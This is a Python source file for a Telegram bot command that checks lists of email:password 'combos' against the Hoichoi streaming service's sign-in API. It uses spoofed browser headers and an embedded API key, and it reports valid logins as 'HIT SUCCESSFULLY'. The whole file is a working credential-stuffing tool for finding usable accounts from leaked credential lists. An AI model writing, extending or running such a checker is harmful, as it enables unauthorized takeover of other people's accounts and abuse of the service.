import requests
import time

def process_hoi_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ HOI ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_hoi_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /hoi email:password")

def check_hoi_account(account):
    email, password = account.split(':')
    login_url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-364a8001-dbe1-2d16-ddde-33429eb8474c"
    headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.hoichoitv",
        "Referer": "https://www.hoichoitv",
        "Sec-Ch-UA": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        "Sec-Ch-UA-Mobile": "?0",
        "Sec-Ch-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "X-API-Key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    }
    data = {
        "email": email,
        "password": password
    }

    response = requests.post(login_url, headers=headers, json=data)
    response_data = response.json()

    if "error" in response_data:
        error_message = response_data["error"]
        if "Sorry, we can't find an account with this email address." in error_message:
            return "[BAD] Email Not Registered❌"
        elif "Your email or password is incorrect, please try again." in error_message:
            return "[BAD] EMAIL OR PASSWORD INCORRECT❌"
        else:
            return f"Unexpected error: {error_message}"
    else:
        return "HIT SUCCESSFULLY✅"

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
